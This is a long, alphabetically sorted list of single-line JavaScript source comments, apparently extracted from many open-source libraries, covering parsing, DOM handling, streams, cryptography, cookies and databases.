// Normal cases
// Normal query
// Normalize SVG <use> element events #4963
// Normalize inconsistent values reported by browsers due to
// Normalize multi-line directives
// Normalize the path
// Normalized
// Normally IE won't like `.delete()` and will insist on
// Normally we'd wrap this between comment nodes for the reasons stated
// Not (yet) implemented according to spec
// Not 100% satisfying as non objects can be interpreted as objects but no false negatives so we can live with it
// Not Modified
// Not a binding
// Not an object!
// Not defined by NamedPropertyTracker
// Not enough info.
// Not every plugin in the ordering may be loaded at runtime.
// Not guarded in a canDefineProperty check: IE8 supports defineProperty only
// Not modified
// Not necessarily the package version of this code.
// Not nested
// Not own constructor property must be Object
// Not plain objects:
// Not published yet.
// Not run on Windows as there is no clean way to set maximum file descriptors. Not an issue as the code itself is tested.
// Not standing on a space
// Note ';' is \x3B
// Note stream._type is used for test-module-load-list.js
// Note that it doesn't check whether the array contained duplicates before or not
// Note that none of these types are buildable because the Mozilla Parser
// Note that the list returned by this function is a copy of the internal
// Note that this will have considerable performance and storage
// Note that we've removed escapeTextForBrowser() calls here since the
// Note that xpath string positions user 1-based index
// Note the 12/21 reversal
// Note the difference between $lt (less than) and $gte (less than OR EQUAL)
// Note the use of `!=` which checks for null or undefined.
// Note the use of `==` which checks for null or undefined.
// Note:  The following test does not have any assertion because it
// Note: Converting a Buffer containing an orphan surrogate to a String"
// Note: Custom namespaces should be a UUID string specific to your application!"
// Note: Here subpath starts already with './'
// Note: Keywords are not allows to contain u escapes
// Note: Steps are not terminated here.
// Note: UTF16-LE (or UCS2) codec is Node.js native. See encodings/internal.js
// Note: We assume we're being passed a valid uuid string
// Note: args@other(safe-array) returns@this(safe-array) throws@this(unsafe)
// Note: core module handled by caller
// Note: do not apply default ns to attributes:
// Note: esprima does not recognize conditional catch clauses.
// Note: expansionKeys was not filtered
// Note: expansionKeys was not sorted
// Note: getLengthSync DOESN'T calculate streams length
// Note: ignoring n.lexical because it has no printing consequences.
// Note: obj@any(unsafe)
// Note: obj@any(unsafe) proto@any(unsafe) returns@this(unsafe) throws@this(unsafe)
// Note: obj@this(unsafe) other@other(unsafe) throws@this(unsafe)
// Note: object@other(safe) key@prim throws@this(unsafe)
// Note: object@other(unsafe) key@prim desc@other(safe)
// Note: object@other(unsafe) mock:this(unsafe) throws@this(unsafe)
// Note: object@other(unsafe) throws@this(unsafe)
// Note: other@other(unsafe) mock@other(unsafe) returns@this(unsafe) throws@this(unsafe)
// Note: other@other(unsafe) returns@this(unsafe) throws@this(unsafe)
// Note: other@other(unsafe) throws@this(unsafe)
// Note: packageURL === parentURL === scope
// Note: proto@this(unsafe) other@other(unsafe) name@this(unsafe) throws@this(unsafe)
// Note: protoFactory@this(unsafe) other@other(unsafe) name@this(unsafe) throws@this(unsafe)
// Note: replacing with '\uFFFF' enables false positives in unlikely
// Note: replacing with the ASCII symbol `x` might cause false
// Note: run `npm install unicode-7.0.0` first.
// Note: target@this(unsafe)
// Note: target@this(unsafe) args@this(safe-array) newTarget@this(unsafe) throws@this(unsafe)
// Note: target@this(unsafe) context@this(unsafe) args@this(safe-array) throws@this(unsafe)
// Note: target@this(unsafe) key@prim receiver@this(unsafe) throws@this(unsafe)
// Note: target@this(unsafe) key@prim throws@this(unsafe)
// Note: target@this(unsafe) key@prim value@this(unsafe) receiver@this(unsafe) throws@this(unsafe)
// Note: target@this(unsafe) object@other(unsafe) throws@this(unsafe)
// Note: target@this(unsafe) prop@prim desc@other{safe} throws@this(unsafe)
// Note: target@this(unsafe) prop@prim desc@this(safe) throws@this(unsafe)
// Note: target@this(unsafe) prop@prim desc@this(unsafe) throws@this(unsafe)
// Note: target@this(unsafe) prop@prim throws@this(unsafe)
// Note: target@this(unsafe) throws@this(unsafe)
// Note: this does use older Buffer API on a purpose
// Note: this is the semver.org version of the spec that it implements
// Note: this may cause a problem as list() is _appended_ to the queue
// Note: this node type is *not* an AssignmentExpression with a Pattern on
// Note: this updates `state.lastStringValue` property with the eaten name.
// Note: this'll only find backticks entered in req.query(String)
// Note: to@other(safe) from@this(safe) key@prim throws@this(unsafe)
// Nothing before that: it cannot be a division.
// Nothing could be extracted from the given string
// Nothing indexed
// Nothing pertains to our managed components.
// Nothing should be selected when empty strings follow ^= or $= or *=
// Now `fstat()` to check the `mtime` and store the stat object for
// Now a simple update
// Now commands will be executed
// Now make a sorted array with the results.
// Now parents contains each ancestor that does *not* have a cached native
// Now rightCurlyPos is technically the position just after the }.
// Now the document for Mars doesn't contain the planet field
// Now the fruits array is ['orange']
// Now we can filter arrays using functions and regexes
// Now we can invoke the function asynchronously
// Now we can use objects with an 'age' property as keys
// Now we copy the eval expression to the output buffer from the original
// Now we need to exclude ${ and } characters from the .loc's of all
// Now we need to remove `args[index]` since it's inlined in the `format`
// Nullify .loc information for the child declaration so that we never
// Nullify node.rest now that we have simulated the behavior of
// Number of bytes expected for the current incomplete multi-byte character.
// Number of bytes received for the current incomplete multi-byte character.
// Number of key and number of pieces of data match
// Number of spaces the pretty-printer should use per tab for
// Numbers
// Numeric entity.
// OAuth1.0 - 3-legged server side flow (Twitter example)
// OBSERVED_ERROR state before overwriting it with the real return value
// OMG the serializations!
// OOP
// OR
// ORDER IS IMPORTANT
// OTH
// Object Functions
// Object keys are not toString()-ed
// Object properties:
// Object.getOwnPropertyNames is the only way to enumerate non-enumerable
// Object.oldfunction
// ObjectExpression
// ObjectMethod hoist .value properties to own properties
// Objects
// Objects are kept separately from encodeTable to increase performance.
// Objects specified in the sandbox cannot be frozen.
// Objects that aren't in cssom library but should be:
// Obsolete options
// Obviously not all Emitters should be limited to 10. This function allows"
// Octal form
// Octal number in ES6 starts with '0o'.
// Octal number starts with '0'.
// Of course this can never be true
// Of course we collect tokens here.
// Of course you can create multiple datastores if you need several
// Offset to adjust scroll
// Offset to adjust scroll when attached to bottom of screen
// Offset value defaults to managed read offset.
// Offset xStart by 1/80 of a pixel. Use something
// Oftentimes this will just deserialize JSON content, but if we have a"
// Okay
// Old IE doesn't give collections access to hasOwnProperty. Assume inputs
// Old node is already unmounted; can't get its instance
// Old webkits (at least until Android 4.0) return 'function' rather than
// Older WebKit doesn't clone checked state correctly in fragments
// Older version of the spec had a resolver object
// Older versions of Node erroneously returned signed integers for
// Omitting only the given fields and removing _id
// On the Node.js/io.js side:
// On the left
// On the right
// Once for each type.namespace in types; type may be omitted
// Once time initialization
// One of the iterations produced an error.
// One type OR another type:
// One-time assignments
// Only Fp curves implemented for now
// Only add this code if we do not already have a canvas implementation
// Only allowed if .computed is true.
// Only assign if different to avoid unneeded rendering.
// Only call deleteListener if there was a listener previously or
// Only catchup() before and after traversing a child node
// Only code that has access to the passkey can retrieve (or forget)
// Only connect is supported in chaining mode.
// Only connect is supported when chaining.
// Only consider this section if the requested source is in the list of
// Only convert to a number if it doesn't change the string
// Only deal with non-null/undefined values
// Only enable in debug mode. A backtrace uses ~1000 bytes of heap space and
// Only expressions need parentheses.
// Only fire when selection has actually changed.
// Only flow one buffer at a time
// Only here to initialize the shape of the object to ensure
// Only inspect one level.
// Only invoke if we have `lastArgs` which means `func` has been
// Only keep the most recent entries
// Only memoize query functions with arity <= 2
// Only monitor this failure once because there tends to be a lot of the
// Only send the Proxy White Listed Header names
// Only server-side rendering really needs this option (see
// Only start the connection timer if we're actually connecting a new
// Only the connect command is supported when chaining proxies.
// Only the elements present in just the first array will remain.
// Only the first item is strictly required.
// Only to ensure that there is no error when using string object.
// Only use addEventListener if the special events handler returns false
// Only use the identifier name if it's an identifier
// Only use the last stack frame because that shows where this function is
// Only warn when we have a callerName. Otherwise we should be silent.
// Only way to know that the right number of results was skipped is if limit + skip > number of results
// Open the IndexedDB database (automatically creates one if one didn't
// Open the WebSQL database (automatically creates one if one didn't
// Open the database; the openDatabase API will automatically
// Opening bracket
// Opera 10-11 does not throw on post-comma invalid pseudos
// Opera 9.64 produces an non-standard string in toString().
// Opera reports offsetWidths and offsetHeights less than zero on some elements
// Opera tests
// Operate on a copy of prop so per-property easing won't be lost
// Operator (capture 2)
// Operators are parsed inline in tiny state machines. '=' (61) is
// Operators. These carry several kinds of properties to help the
// Optimize `isFunction` if appropriate.
// Optimize for Arrays. Big arrays could kill the performance otherwise!
// Optimize the case of one listener. Don't need the extra array object.
// Optimize the most common form: 'continue;'.
// Optimized for most common case
// Option to run scripts is true for back-compat
// Optional auxiliary prober for name decision
// Optional features; can be installed and uninstalled
// Optional fields
// Options do not matter in browser setup
// Options inside disabled selects are incorrectly marked as disabled
// Options matching.
// Or a match is found and deletePath will contain the path from the root to the node to delete after the loop
// Or just use first one
// Or:
// Original can be found at:
// Original column.
// Original line.
// Original name.
// Original props are copied
// Original source.
// Original to generated
// Orphan paths have no relationship to repair.
// Other 2-character punctuators: ++ -- &lt;&lt; &gt;&gt; &amp;&amp; ||
// Other 2-character punctuators: ++ -- << >> && ||
// Other environments
// Other options settable:
// Otherwise add one to the end
// Otherwise append
// Otherwise append directly
// Otherwise default to sane options
// Otherwise increment major.
// Otherwise increment minor.
// Otherwise initialize for horizontal or vertical properties
// Otherwise just get the value from the style object
// Otherwise nodes in our document sort first
// Otherwise remove but only if the item exists
// Otherwise restore preexisting value
// Otherwise secure it in a non-enumerable property
// Otherwise throw an Invalid Package Target error.
// Otherwise use obj as the value of the new FastPath instance.
// Otherwise use the full result
// Otherwise we know they are disconnected
// Otherwise we need full lists of their ancestors for comparison
// Otherwise we risk emitting data in the flow()
// Our needle is greater than aHaystack[mid].
// Our needle is less than aHaystack[mid].
// Our trigger point will be 3600*24*31*6 (since we already use 31
// Out of bounds index
// Out:
// Outdated Node.js
// Outdent whatever the
// Output a sequence of chars.
// Outputs the length of the database.
// Overflow
// Overide with custom offset.
// Override Dp.buildable for this Def instance.
// Override IP address of a hostname
// Override final display type on visible
// Override manipulation of globals by nested matchers
// Override mime type if needed
// Override push to accept second parameter representing priority
// Overrides native regex methods with fixed/extended versions that support named
// Overrides response content-type header
// PHP
// PLEASE NOTE: sockets need to be resumed before any data will come in or out as they are paused right before this callback is fired.
// PRIVATE DATA PROPERTIES
// PROFOUNDLY annoying habit of not closing handles promptly when
// PUBLIC DATA PROPERTIES (TODO: should be getters)
// PWD is optional
// Pad
// Pad data
// Panic based approach to setting things on disconnected nodes
// Parameter normalization
// Paranoia
// Parentless nodes are either documents or disconnected
// Parse a class declaration or literal (depending on the
// Parse a full expression. The optional arguments are used to
// Parse a function declaration or literal (depending on the
// Parse a list of variable declarations.
// Parse a regular `for` loop. The disambiguation code in
// Parse a single statement.
// Parse a ternary conditional (`?:`) operator.
// Parse an assignment expression. This includes applications of
// Parse an object literal or binding pattern.
// Parse args.
// Parse argument.
// Parse arrow function expression with given parameters.
// Parse base64
// Parse binary operators with the operator precedence parsing
// Parse domain with nested subdomains
// Parse domain with subdomain
// Parse domain without subdomain
// Parse domain."
// Parse element name
// Parse element value
// Parse environment.
// Parse function body and check parameters.
// Parse node.source.
// Parse object or class method.
// Parse out just the content type from the header (ignore the charset)
// Parse remaining as usual.
// Parse static init block
// Parse template expression.
// Parse text as xml
// Parse the next token as an identifier. If `liberal` is true (used
// Parse value
// Parses a comma-separated list of module exports.
// Parses a comma-separated list of module imports.
// Parses array and generator comprehensions.
// Parses assignment pattern around given atom if possible.
// Parses import declaration.
// Parses lvalue (assignable) atom.
// Parses module export declaration.
// Parses spread element.
// Parses yield expression inside generator.
// Partially applied with placeholders.
// Partially apply a function by creating a version that has had some of its
// Pass `top` to keep the current
// Pass `true` below to allow duplicate names and sources. While source maps
// Pass a simple key-value pair
// Pass a string as options.sourceFileName to recast.parse to tell the
// Pass data via Buffers
// Pass data via Streams
// Pass multiple values /w an Array
// Pass this if window is not defined yet
// Pass undefined as func to delete nodePrototype[name].
// Passing an empty string as a 3rd parameter to .css will automatically
// Passing file.program here instead of just file means that initial
// Passing forward and returning specific backreferences
// Passing to XRegExp dies on octals and ensures the outer pattern is independently valid;
// Passing to XRegExp enables entended syntax for subpatterns provided as strings
// Path's value was reached.
// Pauses data flow of the socket (this is internally resumed after 'established' is emitted)
// Peek at available data (we need at least 5 bytes to get the hostname length)
// Peek more characters.
// Per 4.1.4 - Convert from unix epoch to Gregorian epoch
// Per 4.2.1.2 Throw error if too many uuids are requested
// Per 4.3
// Perform a deep comparison to check if two objects are equal.
// Perform concrete-algorithm logic
// Perform concrete-cipher logic
// Perform concrete-hasher logic
// Perform operation on file here.
// Perform the `toStringTag` check first to avoid errors with some
// Perform the update
// Permanent state.
// Permission is hereby granted, free of charge, to any person obtaining a"
// Permuted Choice 1 constants
// Permuted Choice 2 constants
// Persistence handling
// PhantomJS 2 has enumerable non-index properties on typed arrays.
// PhantomJS can only require() relative files
// Piggyback on a donor event to simulate a different one
// Place to keep original methods.
// Please convert your array into string
// Please use getLength(callback) to get proper length
// Please use the [github bug tracker][ghbt] to report issues."
// Pluck off n bytes from an array of buffers.
// Plug in your RNG constructor here
// Pointless program contents included for extra color.
// Pool size must be a multiple of 4 and greater than 32.
// Poor man's deep object cloning.
// Pop the closing '}' added from the lookahead.
// Pop the opening '<' added from the lookahead.
// Populate exports for all constructors
// Populate the class2type map
// Populate the extensions/types maps
// Port
// Ported from OpenBSD bcrypt_pbkdf.c v1.9
// Ported from https://github.com/mafintosh/end-of-stream with
// Ported from https://github.com/mafintosh/pump with
// Ported in 2014 by Dmitry Chestnykh and Devi Mandiri.
// Ported loosely from BouncyCastle's Java EC code
// Position information for the previous token
// Position-in-collection
// Positions to delayed-check that yield/await does not exist in default parameters.
// Possible identifier start in a surrogate pair.
// Potentially complex pseudos
// Pre-v4 Buffer API
// Precompute some stuff. Mostly unnecessary once we take care of the TODO below.
// Precomputed Rcon lookup
// Predicate that tests whether the next token is of the given
// Preface gives us something to blacklist in warning module
// Prefer textContent to innerText because many browsers support both but
// Prefer to break application/xml over text/html (for now) by adding
// Prefix every selector in the list
// Prefixes *only* this request
// Prepare char buffer for decoding.
// Preparing update (if an error is thrown here neither the datafile nor
// Prepend if requested
// Prepend the new node to the beginning of the list
// Prepending a string works.
// Prepending an array works.
// Prepending another source node works.
// Prepending other stuff doesn't.
// Preserve comments
// Preserve line numbers with single parens param ugly code.
// Preserve line numbers with single parens-free param ugly code.
// Preserve lines transforming ugly code.
// Preserve script evaluation history
// Preserve typechecker annotation.
// Pretend this is some complicated async factory
// Prevent further modifications to the File type (and any other
// Prevent inserting spaces between operator and argument if it is unnecessary
// Prevent memory leaks
// Prevent never-ending loop
// Prevent triggered image.load events from bubbling to window.load
// Prevents caching of *only* this request
// Previous code is invalid
// Previous uuid creation time
// Previously we would throw an error if we didn't have an internal
// Prime the next lookahead.
// Primitive polynomial over GF(2): x^8 + x^6 + x^5 + x^4 + 1
// Primitive query against a primitive type
// Primitive types cannot have properties
// Print a warning maybe?
// Print all of the news items on Hacker News
// Print the HTML for the Google homepage.
// Print the entire AST generically.
// Print the error if one occurred
// Print the response status code if a response was received
// PrintResult of recast.print will have a .map property for the
// Prints: 2
// Prints: <Buffer 88 13 70 17>
// Prints: <Buffer 88 13 a0 0f>
// Prioritize #id over <tag> to avoid XSS via location.hash (#9521)
// Prioritize by case sensitivity in case custom pseudos are added with uppercase letters
// Private state that needs to be reset before every traversal.
// Private symbol for identifying `SourceNode`s when multiple versions of
// Private/Internal methods
// Probably an error on in uv_guess_handle()
// Process available blocks
// Process blocks
// Process data that we have.
// Process doctype info ans stop parsing
// Process final blocks
// Process partial blocks
// Processed fragments are accessed by calling `shiftNextLine`.
// Processed fragments are removed from this array.
// Produce a duplicate-free version of the array. If the array has already
// Produce an array that contains every item shared between all the
// Produce an array that contains the union: each distinct element from all of
// Produce number
// Program nodes introduce global scopes.
// Project configuration.  
// Project: https://github.com/oozcitak/xmlbuilder-js
// Projective coordinates: either zinv == null or z * zinv == 1
// Prologue.
// Promise
// Promises
// Promises code.
// Propagate exception as error if not done
// Properties
// Properties of context are called as methods if possible
// Properties of the current token:
// Property Assignment: Getter and Setter.
// Property already exist. Overwrite it.
// Protect against constructing XRegExps within token handler and trigger functions
// Protect against double callback
// Protectiona against zip bombs and other nuisance
// Protects against subtle transform bugs like:
// Provide `match` to avoid retokenization if we modified the selector above
// Provide a hook for user-specified inspect functions.
// Provide a link from the copy to the original.
// Provide the compiled function source as a convenience for precompilation.
// Provide the compiled function's source by its `toString` method or
// Provider=OraOLEDB.Oracle;Data Source=test;User Id=sys;Password=;Persist
// Providing `customFlags` with null `regex` and `handler` allows adding flags that do
// Proxy feature functions to features module.
// Proxy version (4 or 5)
// Public API
// Public API to check if length of added values is known
// Public API"
// Public API.
// Public domain.
// Punctuation token types.
// Punctuation tokens.
// Purposefully self-exclusive
// Push the requested markup with an additional RESULT_INDEX_ATTR
// Push two new nodes onto the end of a list of nodes:
// Pushing to an array
// Put all encoding/alias/codec definitions to single object and export it. 
// Put explicitly provided properties onto the event object
// Put in the new values to get a computed value out
// Python-style named capture syntax was added to XRegExp to avoid octal-related errors in Opera. Recent Opera supports (?P<name>..) and (?P=name) based on abandoned ES4 proposals
// QSA and matchesSelector support
// Queue a load of the database right away and call the onload handler
// Queue of execution data for repeatable lists
// Queueing
// Quite a lot of acorn.js is duplicated here. The alternative was to"
// Quotes produce strings.
// RESOLVE_ESM_MATCH(MATCH)
// RFC 3490 separators
// RFC 959 does not require each line in a multi-line response to begin
// RFC3501 Sec. 5.1.3 Modified UTF-7 (http://tools.ietf.org/html/rfc3501#section-5.1.3)
// RFC6265 S5.1.4 Paths and Path-Match
// RFC6365 S5.4
// RMD is optional
// Radios and checkboxes getter/setter
// Raise an unexpected token error.
// Ramda aliases.
// Ran off the end of the file - the whole thing is a comment
// Random Distribution Ration = 512 / (2350-512) = 0.279.
// Random Distribution Ration = 512 / (2965+62+83+86-512) = 0.191
// Random Distribution Ration = 512 / (3755 - 512) = 0.157
// Random Distribution Ration = 512/(5401-512)=0.105
// Randomize replacement to avoid unbalancing the tree too much
// Raw net.Socket
// Raw string
// Re-assign `events` because a newListener handler could have caused the
// Re-fetching with find should yield the persisted value
// Re-fetching with findOne should yield the persisted value
// React-specific: avoid traversing React elements' _owner.
// ReactCompositeComponent uses this:
// ReactDOMComponentTree uses these:
// ReactDOMOption looks at this initial value so the initial generated
// ReactUpdatesFlushTransaction's wrappers will clear the dirtyComponents
// Read address type
// Read all options
// Read an identifier or keyword token. Will check for reserved
// Read an integer in the given radix. Return null if zero digits
// Read buffer value
// Read rules from file."
// Read state only from initial mount because <select> updates value
// Read string value
// Read value
// ReadOnly Archive -ar--
// Readable class this is attached to
// Reading boolean to protect against _read
// Reads template string tokens.
// Rebalance the tree and update all heights
// Rebalancing needed
// Recall that origLoc is the .loc of an ancestor node that is
// Record all 3 overflow attributes because IE9-10 do not
// Record the characters to be added to the DOM.
// Record the component responsible for creating this element.
// Record the new index of the last-seen occurrence of typeName.
// Records if CSS transition is available
// Recover leading whitespace by temporarily prepending any character.
// Recreate all indexes in the datafile
// Recurse if we're merging plain objects or arrays
// Recurse.
// Recursive behaviour testing done in the above test on $ signs
// Recursively compare arrays (susceptible to call stack limits).
// Recursively compare objects (susceptible to call stack limits).
// Recursively compare objects and arrays.
// Recursively convert values (susceptible to call stack limits).
// Recursively flatten arrays (susceptible to call stack limits).
// Recursively merge objects and arrays (susceptible to call stack limits).
// Recursively populate clone (susceptible to call stack limits).
// Reduce context if the leading compound selector is an ID
// Reduce the set of matched elements to the one at the specified index.
// Reduce time spent doing lookups by setting these on the prototype.
// Reduce: make a binary expression from the three topmost entries.
// Reenable scripts
// Ref: https://tools.ietf.org/html/rfc6455#section-9.1
// Refactor to not be a naive line-by-line parse.
// Reference original init
// Reference supertype
// Refers to issue #492 - https://github.com/mozilla/localForage/issues/492
// RegExp.prototype.test is overridden but not extended by XRegExp
// RegExpIdentifierName ::
// RegExpIdentifierPart ::
// RegExpIdentifierStart ::
// RegExps are compared by their source patterns and flags.
// Regex strategy adopted from Diego Perini
// Regexes containing the keys and values listed immediately above.
// Regexes that match native regex syntax
// Register itself as a running localForage in the current context.
// Register the new context in the global container.
// Registered plugins
// Regular character
// Regular expressions
// Regular stringify
// Reinherit class heirarchy with EventTarget at its root
// Reintegrate element matches to eliminate the need for sorting
// Reject parenthesized strings.
// Related ticket - https://bugzilla.mozilla.org/show_bug.cgi?id=687787
// Related ticket - https://code.google.com/p/chromium/issues/detail?id=449857
// Relavant specs
// Relies on `updateStylesByID` not mutating `styleUpdates`.
// Remain active as long as any of the model probers are active.
// Remaining properties are added to a new props object
// Remaining properties override existing props
// Remember that setFilters inherits from pseudos
// Remember that the DOM is ready
// Remember that we already checked any headers in the params
// Remember the original values
// Remember the top-level container
// Remember this block to use with next block
// Remove *all* instances
// Remove IV for subsequent blocks
// Remove a callback from the list
// Remove a node and its parent if it would leave a redundant AST node:
// Remove a node from a list of nodes:
// Remove all callbacks from the list
// Remove and return the first node in a list of nodes:
// Remove and return the last node in a list of nodes:
// Remove any remaining nodes
// Remove any rendered children.
// Remove authorization if changing hostnames (but not if just
// Remove auto dataType and get content-type in the process
// Remove boolean attributes when set to false
// Remove byte order marker. This catches EF BB BF (the UTF-8 BOM)
// Remove children that are no longer present.
// Remove data and the expando if it's no longer used
// Remove duplicates
// Remove element nodes and prevent memory leaks
// Remove event specific arrays for event types that no
// Remove fallback content. There is no way to hide text nodes so we
// Remove from its parent by default
// Remove generic event handler if we removed something and no more handlers exist
// Remove hash character (#7531: and string promotion)
// Remove iconv-lite Node primitive extensions.
// Remove index on field somefield
// Remove internal listeners
// Remove leading wildcard.
// Remove matching events
// Remove multiple documents
// Remove one document from the collection
// Remove one more byte -- the 0x80 byte
// Remove padding
// Remove processed words
// Remove salt from ciphertext
// Remove the circular structure
// Remove the expando if there's no more data
// Remove the first object from the stack of traversed objects.
// Remove the index so new ones get assigned during deserialization
// Remove the list item's bullet
// Remove the selected bit from all other options in this group
// Remove the source file from the _sourcesContents map.
// Remove the trailing 'Z' on the timestamp string for CodeCommit git access
// Remove two docs simultaneously
// Remove unshift function
// Remove with no match
// Remove wrapper from fragment
// Remove zero padding
// Removed to create an eval-free library
// Removing leading zeros in order to avoid treating as octal in old browsers.
// Render each group of markup with similar wrapping `nodeName`.
// Render params.
// Render template.
// Render the group heading with the heading-specific indent.
// Reopen the database for upgrading.
// Replace `_.memoize.Cache`.
// Replace a document by another
// Replace delimiters with snippets.
// Replace each astral symbol and every Unicode code point
// Replace each astral symbol and every Unicode escape sequence that
// Replace one node with another node:
// Replace the default `ready()` function with the specialized one.
// Replace the third element in an array with two new nodes:
// Replace {{variable}} in `s` with the template data in `d`.
// Replace/restore the type attribute of script elements for safe DOM manipulation
// Reported here:
// Represent delta as a generalized variable-length integer
// Represent delta as a generalized variable-length integer.
// Require Mime class
// Require either new content or an interest in ignored elements to invoke the callback
// RequireJS
// Required (one of `names` or `name`).
// Required until https://github.com/nodejs/node/issues/9006 is resolved.
// Required.
// Requires jsbn.js and jsbn2.js
// Reserved names are extracted
// Reserved values are passed in at call site.
// Reserved word lists for various dialects of the language
// Reset
// Reset CSS: box-sizing; display; margin; border; padding
// Reset any `maxWait` timer.
// Reset block mode
// Reset cipher
// Reset data buffer
// Reset localForage before each test so we can call `config()` without
// Reset nsecs if clock regresses (new clockseq) or we've moved onto a new
// Reset pending fields
// Reset the inline display of this element to learn if it is
// Reset trie node.
// Resolve all form elements from either forms or collections of form elements
// Resolve default props
// Resolve its promise (which is part of the database readiness
// Resolves pending promise (prevents memory leaks).
// Response headers
// RestElement inside of a function parameter must be an identifier
// Restart the tests if they're blocking
// Restart the timer.
// Restore matcherIn since elem is not yet a final match
// Restore the `call` and `apply` methods from `Function`
// Restores native regex methods
// Result spans more than one buffer.
// Resulting key/value pair -- this callback
// Resulting string of code.
// Results are in ascending order
// Results are in descending order
// Rethrow the error if it exists to avoid swallowing it
// Retrieve an item from the store. Unlike the original async_storage
// Retrieve the DOM elements matched by the jQuery object.
// Retrieve the names of an object's properties.
// Retrieve the value and the unit
// Retrieve the values of an object's properties.
// Retrieving data (always returned as an array of all data stored for this key)
// Retrocompatibility with v0.6 and before
// Return '*' instead of '' so that truthiness works.
// Return a completely flattened version of an array.
// Return a copy of the object only containing the whitelisted properties.
// Return a copy of the object without the blacklisted properties.
// Return a copy of the original AST so that any changes made may be
// Return a css property mapped to a potentially vendor prefixed property
// Return a defensive copy of any existing FastPath instances.
// Return a random integer between min and max (inclusive).
// Return a simpler request object to allow serialization
// Return a simpler response object to allow serialization
// Return a sorted list of the function names available on the object.
// Return a version of the array that does not contain the specified value(s).
// Return all the elements for which a truth test fails.
// Return all the elements in a clean array
// Return all the elements that pass a truth test.
// Return an `undefined` value to omit a property.
// Return decoded string
// Return early from calls with invalid selector or context
// Return early if doc is invalid or already selected
// Return encoded string
// Return final computed hash
// Return if no value or not a string or function
// Return jQuery for attributes-only inclusion
// Return just the one element from the set
// Return only captures needed by the pseudo filter method (type and argument)
// Return params
// Return processed words
// Return special upon seeing a positional matcher
// Return the array of values
// Return the cloned set
// Return the entire attribs object if no attribute specified
// Return the entire data object if no data specified
// Return the exports of the module
// Return the first value which passes a truth test. Aliased as `detect`.
// Return the key located at key index X; essentially gets the key from a
// Return the length of the invalid excess
// Return the maximum element or (element-based computation).
// Return the minimum element (or element-based computation).
// Return the modified object
// Return the newly-formed element set
// Return the number of elements in an object.
// Return the resulting serialization
// Return the results of applying the iterator to each element.
// Return the right type based on the code/type set during
// Return true if provided expression is LeftHandSideExpression
// Return true if the next JSX token matches the specified punctuator.
// Return true if the next token is an assignment operator
// Return true if the next token matches the specified contextual keyword
// Return true if the next token matches the specified keyword
// Return true if the next token matches the specified punctuator.
// Return true if there is a line terminator before the next token.
// Return undefined instead of __proto__ if '__proto__' is not an own property
// Return upserted document
// Returning defined value will break the cycle.
// Returns ['howdoyoudo']
// Returns a function that will only be executed after being called N times.
// Returns a modified function which warns once by default.
// Returns a wrapped value.
// Returns all complete UTF-8 characters in a Buffer. If the Buffer ended on a
// Returns an object mapping from every known type in the defCache to the
// Returns an unwrapped value.
// Returns everything but the first entry of the array. Aliased as `tail` and `drop`.
// Returns everything but the last entry of the array. Especially useful on
// Returns from the function before the alert runs.
// Returns only complete characters in a Buffer
// Returns the address for the network interface on the current system with"
// Returns true if object is a DOM element.
// Reusable object
// Reusable objects
// Reusable objects for temporary values
// Reuse newcache so results back-propagate to previous elements
// Reuse original spaces if the indentation is correct.
// Reuse the same AST structure for Array.prototype.slice.call.
// Reused empty array added for node fields that are always empty.
// Reverse direction for :only-* (if we haven't yet done so)
// Reverse order for parents* and prev-derivatives
// Revert the changed values
// Revert the lex().
// Revert the old values
// Revert the select back to its default unselected state.
// Revert to the DOM batching strategy since these two renderers
// Rewind from expr.loc.start over any whitespace and the ${ that
// Rewrite backreferences. Passing to XRegExp dies on octals and ensures patterns
// Rewrite the backreference
// Rho Pi
// Rho pi at x = y = 0
// Rollback any index which didn't fail
// Root
// Root mounting (innerHTML set) is recorded with an ID of ''
// Rot word
// Rotate lanes
// Round up to include partial blocks
// Rounds
// Run a function **n** times.
// Run all tests in a browser environment.
// Run before window.onload to make sure the specs have access to describe()
// Run callback and check for early termination
// Run delegates first; they may want to stop propagation beneath us
// Run in reverse order
// Run some jQuery on a html fragment
// Run tests using Sauce Labs if we are on Travis or have locally
// Run the regex
// Run this code once the database has been entirely deleted.
// Run this code once the key has been removed.
// Run this code once the value has been
// Running getBoundingClientRect on a disconnected node
// Running localForages sharing a database.
// Runs the callback with process.env temporarily set to env.
// S3 doesn't always encode characters > 127 correctly and
// S4.1.2.3 & S5.2.3: ignore leading .
// S4.1.2.3 suggests that this is bad. domainMatch() tests confirm this
// S5.1.2 Canonicalized Host Names
// S5.1.3 Domain Matching
// S5.2 step 1
// S5.2.1
// S5.2.2
// S5.2.3
// S5.2.4
// S5.2.5
// S5.2.6 -- effectively the same as 'secure'
// S5.3 step 1
// S5.3 step 10
// S5.3 step 2
// S5.3 step 3: NOOP; persistent-flag and expiry-time is handled by getCookie()
// S5.3 step 4: NOOP; domain is null by default
// S5.3 step 5: public suffixes
// S5.3 step 6:
// S5.3 step 8: NOOP; secure attribute
// S5.3 step 9: NOOP; httpOnly attribute
// S5.4 part 3
// SBCSGroupProber. The two SBCharSetProbers identify that the text is in
// SBOXes and round permutation constants
// SECNamedCurves
// SELECT * FROM ${db}.${table} WHERE ROWNUM=0
// SELECT TOP 1 * FROM table2
// SELECT TOP 1 * FROM table3
// SELECT TOP 20 * FROM table1 ORDER BY 1 DESC
// SES uses a different domain from the service name
// SIMPLENOT allow disabling complex selectors nested
// SOCKS command (createConnection factory function only supports the connect command)
// SOCKS proxy failed to bind.
// SOCKS proxy to connect to
// SVG
// SVG <text> elements don't support innerText even when <div> does.
// SVG-related properties
// SYST is optional
// Sadly this is not cacheable as some libraries bundle their own
// Safari 5.0 bug
// Safari 9 has enumerable `arguments.length` in strict mode.
// Safari doesn't give you a stack. Let's at least provide a source line.
// Safari may fire events on text nodes (Node.TEXT_NODE is 3).
// Safari sends mouseenter too often; see:
// Safari test
// Safe example: tee to both data handlers
// Safe example: tee to both places
// Safe object type checking
// Same API as BinarySearchTree
// Same as above
// Same as previous.
// Same database as above
// Same key as root
// Same key: no change in the tree structure
// Same protocol
// Same protocol - do bitwise and
// SameValue algorithm
// Sampling from about 20M text materials include literature and computer technology
// Sauce Labs tests.
// Save and Reload Toolbar
// Save back as free
// Save bytes in the minified (but not gzipped) version:
// Save call stack for later use.
// Save it to be reused later.
// Save old counter values
// Save response for use in complete callback
// Save selector and tokenization
// Save the URL in case we're toying with the If-Modified-Since
// Save the callback name for future use
// Save the height. Do this only whenever the window is resized so we don't
// Save the original value to pass to the callback.
// Save the previous value of the `_` variable.
// Scan for the next immediate token.
